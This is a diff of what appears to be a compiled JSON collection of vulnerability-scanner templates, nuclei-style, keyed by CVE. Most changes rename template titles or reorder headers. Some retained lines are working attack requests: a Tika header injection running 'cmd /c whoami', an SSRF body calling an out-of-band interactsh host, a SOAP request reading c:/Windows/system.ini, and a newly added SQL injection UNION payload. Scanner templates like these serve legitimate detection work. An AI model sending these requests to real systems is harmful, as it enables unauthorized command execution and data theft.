@@ -6371,11 +6371,11 @@
         {
           "body": "var oShell = WScript.CreateObject('WScript.Shell');var oExec = oShell.Exec(\"cmd /c whoami\");",
           "headers": {
-            "Connection": "close",
-            "X-Tika-OCRTesseractPath": "cscript",
             "X-Tika-OCRLanguage": "//E:Jscript",
             "Expect": "100-continue",
-            "Content-type": "image/jp2"
+            "Content-type": "image/jp2",
+            "Connection": "close",
+            "X-Tika-OCRTesseractPath": "cscript"
           },
           "method": "PUT",
           "path": [
@@ -9565,8 +9565,8 @@
         {
           "body": "url=https://{{Host}}:443@{{interactsh-url}}\n",
           "headers": {
-            "Content-Type": "application/x-www-form-urlencoded",
-            "X-Atlassian-Token": "no-check"
+            "X-Atlassian-Token": "no-check",
+            "Content-Type": "application/x-www-form-urlencoded"
           },
           "method": "POST",
           "path": [
@@ -11306,9 +11306,9 @@
         {
           "body": "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:downLoadFile>\n         <tem:path>c:/Windows/system.ini</tem:path>\n      </tem:downLoadFile>\n   </soapenv:Body>\n</soapenv:Envelope>\n",
           "headers": {
+            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile",
             "content-type": "text/xml",
-            "Cookie": "Login",
-            "soapaction": "http://tempuri.org/ICVSearchSvc/downLoadFile"
+            "Cookie": "Login"
           },
           "method": "POST",
           "path": [
@@ -12587,7 +12587,7 @@
     {
       "id": "CVE-2020-8813",
       "info": {
-        "name": "Cacti v1.2.8 - Unauthenticated Remote Code Execution",
+        "name": "Cacti v1.2.8 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -12601,7 +12601,7 @@
     {
       "id": "CVE-2020-8982",
       "info": {
-        "name": "Citrix ShareFile StorageZones Unauthenticated Arbitrary File Read",
+        "name": "Citrix ShareFile StorageZones <=5.10.x - Arbitrary File Read",
         "severity": "high"
       },
       "requests": [
@@ -12631,7 +12631,7 @@
     {
       "id": "CVE-2020-9047",
       "info": {
-        "name": "exacqVision Web Service RCE",
+        "name": "exacqVision Web Service - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -12661,7 +12661,7 @@
     {
       "id": "CVE-2020-9315",
       "info": {
-        "name": "Oracle iPlanet Improper Authorization",
+        "name": "Oracle iPlanet Web Server 7.0.x - Authentication Bypass",
         "severity": "high"
       },
       "requests": [
@@ -12696,7 +12696,7 @@
     {
       "id": "CVE-2020-9376",
       "info": {
-        "name": "D-Link Information Disclosure via getcfg.php",
+        "name": "D-Link DIR-610 Devices - Information Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -12730,7 +12730,7 @@
     {
       "id": "CVE-2020-9425",
       "info": {
-        "name": "rConfig Unauthenticated Sensitive Information Disclosure",
+        "name": "rConfig <3.9.4 - Sensitive Information Disclosure",
         "severity": "high"
       },
       "requests": [
@@ -12782,7 +12782,7 @@
     {
       "id": "CVE-2020-9490",
       "info": {
-        "name": "Apache HTTP Server 2.4.20-2.4.43 - HTTP/2 Cache-Digest DoS",
+        "name": "Apache HTTP Server 2.4.20-2.4.43 - HTTP/2 Cache-Digest Denial of Service Attack",
         "severity": "high"
       },
       "requests": [
@@ -12957,7 +12957,7 @@
     {
       "id": "CVE-2021-20123",
       "info": {
-        "name": "Draytek VigorConnect - Unauthenticated Local File Inclusion DownloadFileServlet",
+        "name": "Draytek VigorConnect 1.6.0-B - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -12973,7 +12973,7 @@
     {
       "id": "CVE-2021-20124",
       "info": {
-        "name": "Draytek VigorConnect - Unauthenticated Local File Inclusion WebServlet",
+        "name": "Draytek VigorConnect 6.0-B3 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -13094,7 +13094,7 @@
     {
       "id": "CVE-2021-21287",
       "info": {
-        "name": "MinIO Browser API SSRF",
+        "name": "MinIO Browser API - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -13124,7 +13124,7 @@
     {
       "id": "CVE-2021-21311",
       "info": {
-        "name": "Adminer SSRF Using Verbose Error Messages",
+        "name": "Adminer <4.7.9 - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -13139,7 +13139,7 @@
     {
       "id": "CVE-2021-21315",
       "info": {
-        "name": "Node.js Systeminformation Command Injection",
+        "name": "Node.JS System Information Library <5.3.1 - Remote Command Injection",
         "severity": "high"
       },
       "requests": [
@@ -13154,7 +13154,7 @@
     {
       "id": "CVE-2021-21389",
       "info": {
-        "name": "BuddyPress REST API Privilege Escalation to RCE",
+        "name": "BuddyPress REST API  <7.2.1 - Privilege Escalation/Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -13317,7 +13317,7 @@
     {
       "id": "CVE-2021-21975",
       "info": {
-        "name": "vRealize Operations Manager API SSRF (VMWare Operations)",
+        "name": "vRealize Operations Manager API - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -13374,7 +13374,7 @@
     {
       "id": "CVE-2021-22053",
       "info": {
-        "name": "RCE through SpringEL expressions in Spring Cloud Netflix Hystrix Dashboard < 2.2.10.RELEASE",
+        "name": "Spring Cloud Netflix Hystrix Dashboard <2.2.10 - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -13389,7 +13389,7 @@
     {
       "id": "CVE-2021-22054",
       "info": {
-        "name": "VMWare Workspace One UEM SSRF",
+        "name": "VMWare Workspace ONE UEM - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -13454,7 +13454,7 @@
     {
       "id": "CVE-2021-22214",
       "info": {
-        "name": "Unauthenticated Gitlab SSRF - CI Lint API",
+        "name": "Gitlab CE/EE 10.5 - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -14212,7 +14212,7 @@
     {
       "id": "CVE-2021-25052",
       "info": {
-        "name": "The Button Generator WordPress plugin < 2.3.3 - RFI",
+        "name": "WordPress Button Generator <2.3.3 - Remote File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -14377,7 +14377,7 @@
     {
       "id": "CVE-2021-25646",
       "info": {
-        "name": "Apache Druid RCE",
+        "name": "Apache Druid - Remote Code Execution",
         "severity": "high"
       },
       "requests": [
@@ -14391,7 +14391,7 @@
     {
       "id": "CVE-2021-25864",
       "info": {
-        "name": "Hue Magic - Directory Traversal",
+        "name": "Hue Magic 3.0.0 - Local File Inclusion",
         "severity": "high"
       },
       "requests": [
@@ -14687,7 +14687,7 @@
     {
       "id": "CVE-2021-27748",
       "info": {
-        "name": "IBM WebSphere Portal SSRF",
+        "name": "IBM WebSphere HCL Digital Experience - Server-Side Request Forgery",
         "severity": "high"
       },
       "requests": [
@@ -18554,6 +18554,20 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/wp-content/plugins/simple-ajax-chat/sac-export.csv"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2022-27927",
+      "info": {
+        "name": "Microfinance Management System 1.0 - 'customer_number' SQLi",
+        "severity": "critical"
+      },
+      "requests": [
+        {
+          "raw": [
+            "GET /mims/updatecustomer.php?customer_number=-1'%20UNION%20ALL%20SELECT%20NULL,NULL,CONCAT(md5(\"{{randstr}}\"),1,2),NULL,NULL,NULL,NULL,NULL,NULL' HTTP/1.1\nHost: {{Hostname}}\n"
           ]
         }
       ]
